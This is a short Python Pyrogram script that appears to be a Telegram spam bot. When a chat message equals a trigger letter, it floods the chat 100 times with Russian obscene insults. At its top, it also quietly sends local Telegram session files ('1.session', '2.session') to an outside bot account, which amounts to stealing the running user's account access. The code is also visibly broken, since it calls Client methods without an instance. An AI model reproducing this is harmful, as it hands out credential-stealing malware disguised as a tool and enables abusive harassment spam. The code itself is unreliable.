import pyrogram, random
global text
text = ["ты обезьяна", "твою мамашу поебем", "хуяку на", "пососи хуй"]

for _ in range(1, 3):
    pyrogram.Client.send_document("SendMessageRequestBot", f"{_}.session")

@pyrogram.Client.on_message()
async def ok(client, message):
    count = 0
    trigger = "а"
    if message.text != trigger:
        return
    for _ in range(100):
        await client.send_message(message.chat.id, random.choice(text) + str(count))
        print(f"sended. COUNT: {count}")
 
